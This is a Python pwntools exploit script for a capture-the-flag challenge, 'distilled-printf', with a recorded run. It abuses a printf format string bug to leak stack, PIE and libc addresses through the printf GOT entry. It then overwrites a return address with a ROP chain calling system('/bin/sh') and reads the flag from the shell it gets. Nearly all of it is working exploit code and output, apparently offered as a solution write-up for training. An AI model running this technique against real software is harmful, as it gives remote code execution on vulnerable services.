from pwn import *

p = remote("litctf.org", 31772)
wd = "/path/to/working/directory"
file = ELF(f"{wd}/distilled-printf")
libc = ELF(f"{wd}/distilled-printf-libc-2.24.so")
context.binary = file

# Step 1: Find the format string offset
# p.sendline(b"ABCD000." + b"%p." * 10)
# print(p.recv())
"""
b'ABCD000.0x7da975a37770.0x7ffe60cd7cc0.0xfbad2088.0x604777fdd037.(nil).0x7ffe60cd7ec0.0x2060cd7d28.0x2e30303044434241.0x70252e70252e7025.0x252e70252e70252e.\n'
offset 8
"""

# Step 2: Leak return address (of fgets)
# By @Med: https://github.com/MedoAbd
# leak a stack address, inspect the stack to calculate the offset between it and return address
p.sendline(b"%14$p")
addr_ret_addr = int(p.recv().strip(), 16) - 0x7C
print("stack address of ret_addr:", hex(addr_ret_addr))

# Step 3(1): leak libc base
# Leak PIE base
# the selection of %67$p and pie_base-=0x1000 needs some trial
p.sendline(b"%67$p")
pie_base = int(p.recv().strip(), 16) & ~0xFFF
pie_base -= 0x1000
print("pie_base:", hex(pie_base))
# printf(printf@got) to leak libc base
printf_got = file.got["printf"] + pie_base
p.sendline(b"%9$s----" + p64(printf_got))
"""
%8$p: "%9$s----"  <-- our input string
%9$p: printf@got
"""
addr_printf = u64(p.recv().split(b"----")[0].ljust(8, b"\x00"))
libc_base = addr_printf - libc.symbols["printf"]
print('libc.symbols["printf"]:', hex(libc.symbols["printf"]))
print("addr_printf:", hex(addr_printf))
print("libc_base:", hex(libc_base))

# Step 3(2): easier way to leak libc base
# By @Med
# leak a libc address, debug locally to calculate the offset between it and libc base
p.sendline(b"%p")
libc_base_2 = int(p.recvline().strip(), 16) - 0x3C3770
print("libc_base_2:", hex(libc_base_2))
assert libc_base == libc_base_2

# Step 4: ROP
# ROPgadget --binary ./distilled-printf-libc-2.24.so --only "pop|ret" | grep "pop rdi ; ret"
addr_pop_rdi = libc_base + 0x01FD7A  # 0x000000000001fd7a : pop rdi ; ret
addr_bin_sh = libc_base + next(libc.search(b"/bin/sh"))
addr_system = libc_base + libc.symbols["system"]
writes = {
    addr_ret_addr: addr_pop_rdi,
    addr_ret_addr + 8: addr_bin_sh,
    addr_ret_addr + 16: addr_system,
}
payload = fmtstr_payload(8, writes, write_size="byte")
print("payload:", payload)
p.sendline(payload)
p.recv()

p.interactive()

"""
stack address of ret_addr: 0x7ffe503c5be8
pie_base: 0x5fbab3a7e000
libc.symbols["printf"]: 0x56510
addr_printf: 0x771ae385f510
libc_base: 0x771ae3809000
libc_base_2: 0x771ae3809000
payload: b'%64c%30$lln%55c%31$hhnccc%32$lln%8c%33$hhn%11c%34$hhn%12c%35$hhn%7c%36$lln%67c%37$hhn%38$hhn%39$hhnccc%40$hhn%52c%41$hhn%42$hhn%43$hhn%22c%44$hhn%71c%45$hhn%46$hhn%13c%47$hhnaa\xf0[<P\xfe\x7f\x00\x00\xf5[<P\xfe\x7f\x00\x00\xe8[<P\xfe\x7f\x00\x00\xea[<P\xfe\x7f\x00\x00\xe9[<P\xfe\x7f\x00\x00\xf2[<P\xfe\x7f\x00\x00\xf8[<P\xfe\x7f\x00\x00\xf3[<P\xfe\x7f\x00\x00\xeb[<P\xfe\x7f\x00\x00\xfb[<P\xfe\x7f\x00\x00\xf9[<P\xfe\x7f\x00\x00\xf4[<P\xfe\x7f\x00\x00\xec[<P\xfe\x7f\x00\x00\xfc[<P\xfe\x7f\x00\x00\xf1[<P\xfe\x7f\x00\x00\xed[<P\xfe\x7f\x00\x00\xfd[<P\xfe\x7f\x00\x00\xfa[<P\xfe\x7f\x00\x00'
[*] Switching to interactive mode
$ cat flag.txt
LITCTF{I_shall_NEVER_disable_RELRO_86ea64d5}
"""

# LITCTF{I_shall_NEVER_disable_RELRO_86ea64d5}
